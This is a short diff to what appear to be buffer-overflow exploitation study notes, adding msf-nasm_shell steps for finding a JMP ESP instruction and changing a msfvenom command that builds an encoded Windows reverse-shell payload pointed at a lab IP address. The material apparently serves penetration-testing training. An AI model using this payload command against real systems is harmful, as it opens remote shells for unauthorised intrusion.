@@ -11,6 +11,11 @@ msf-pattern_offset -l 800 -q 42306142
 - Immunity https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/
 4. Find module and JMP ESP
 - Use metasploit nasm_shell
+```
+msf-nasm_shell
+jmp esp
+add eax,12
+```
 - Use debugger and mona to find JMP ESP
 ```
 !mona modules
@@ -18,5 +23,5 @@ msf-pattern_offset -l 800 -q 42306142
 ```
 5. Create shellcode
  ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 -f py –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
  ```
